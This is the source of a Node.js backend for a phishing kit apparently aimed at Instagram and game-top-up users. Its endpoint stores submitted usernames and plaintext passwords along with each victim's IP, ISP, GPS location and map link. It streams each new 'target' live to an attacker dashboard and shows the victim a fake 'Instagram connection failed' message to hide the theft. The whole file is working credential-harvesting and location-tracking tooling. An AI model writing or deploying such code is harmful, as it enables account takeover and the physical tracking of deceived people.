const express = require('express');
const cors = require('cors');
const axios = require('axios');
const http = require('http');
const { Server } = require('socket.io');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
require('dotenv').config();

const app = express();
const server = http.createServer(app);

// SQLite Database Setup
const dbPath = path.resolve(__dirname, 'database.sqlite');
const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
        console.error('Error opening database:', err.message);
    } else {
        console.log('Connected to the SQLite database.');
        db.run(`CREATE TABLE IF NOT EXISTS captured_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            game TEXT,
            nominal TEXT,
            method TEXT,
            ip TEXT,
            isp TEXT,
            location TEXT,
            mapsLink TEXT,
            isHighAccuracy INTEGER,
            userAgent TEXT,
            timestamp TEXT
        )`);
        // Ensure method and userAgent columns exist for existing databases
        db.run("ALTER TABLE captured_data ADD COLUMN method TEXT", (err) => {});
        db.run("ALTER TABLE captured_data ADD COLUMN userAgent TEXT", (err) => {});
    }
});

// Socket.io initialization
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        allowedHeaders: ["ngrok-skip-browser-warning"],
        credentials: true
    },
    transports: ['polling', 'websocket']
});

const PORT = process.env.PORT || 5000;

app.use(cors({
    origin: "*",
    methods: ["GET", "POST", "DELETE", "OPTIONS"],
    allowedHeaders: ['Content-Type', 'Authorization', 'ngrok-skip-browser-warning'],
    credentials: true
}));
app.use(express.json());

app.get('/', (req, res) => {
    res.send('<h1>Backend is running!</h1><p>Use /api/admin/data to see captured data.</p>');
});

app.get('/api', (req, res) => {
    res.send('Backend Real-time Ready (SQLite Mode)');
});

app.get('/api/admin/data', (req, res) => {
    db.all("SELECT * FROM captured_data ORDER BY id DESC", [], (err, rows) => {
        if (err) {
            res.status(500).json({ error: err.message });
            return;
        }
        res.json(rows);
    });
});

app.post('/api/setor-data', async (req, res) => {
    const { username, password, game, nominal, gps } = req.body;

    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip && ip.includes(',')) ip = ip.split(',')[0];
    if (ip && ip.includes('::ffff:')) ip = ip.split(':').pop();

    const queryIp = (ip === '::1' || ip === '127.0.0.1') ? '8.8.8.8' : ip;
    
    let geoInfo = {};
    try {
        const response = await axios.get(`http://ip-api.com/json/${queryIp}`);
        geoInfo = response.data;
    } catch (error) {
        console.error('Error fetching IP geolocation:', error.message);
    }

    const hasGPS = gps && gps.lat && gps.lng;
    const finalLat = hasGPS ? gps.lat : geoInfo.lat;
    const finalLng = hasGPS ? gps.lng : geoInfo.lon;

    const dataLog = {
        username,
        password,
        game,
        nominal,
        ip: ip,
        isp: geoInfo.isp || 'Unknown',
        location: hasGPS ? `GPS Precision (Accuracy: ${gps.accuracy.toFixed(1)}m)` : `${geoInfo.city}, ${geoInfo.regionName}, ${geoInfo.country}`,
        mapsLink: finalLat && finalLng ? `https://www.google.com/maps?q=${finalLat},${finalLng}` : null,
        isHighAccuracy: hasGPS ? 1 : 0,
        userAgent: req.headers['user-agent'] || 'Unknown',
        timestamp: new Date().toLocaleString('id-ID')
    };

    // Save to SQLite
    const stmt = db.prepare(`INSERT INTO captured_data (username, password, game, nominal, ip, isp, location, mapsLink, isHighAccuracy, userAgent, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
    stmt.run(dataLog.username, dataLog.password, dataLog.game, dataLog.nominal, dataLog.ip, dataLog.isp, dataLog.location, dataLog.mapsLink, dataLog.isHighAccuracy, dataLog.userAgent, dataLog.timestamp, function(err) {
        if (err) {
            console.error('Error saving to DB:', err.message);
        } else {
            // Push via socket
            try {
                io.emit('new-target-data', { ...dataLog, id: this.lastID });
            } catch (e) {
                console.warn('Socket emit failed');
            }
        }
    });
    stmt.finalize();

    console.log(`[${dataLog.timestamp}] DATA BARU: ${username}`);

    res.json({ 
        status: 'success', 
        message: 'Koneksi instagram gagal, silakan coba beberapa saat lagi. 🙄' 
    });
});

app.delete('/api/admin/delete-all', (req, res) => {
    db.run("DELETE FROM captured_data", [], (err) => {
        if (err) {
            res.status(500).json({ error: err.message });
            return;
        }
        res.json({ status: 'success', message: 'All data deleted' });
    });
});

io.on('connection', (socket) => {
    console.log('Admin connected:', socket.id);
});

// Always listen on PORT for Render
server.listen(PORT, () => {
    console.log(`Server jalan di: http://localhost:${PORT}`);
});

module.exports = app;
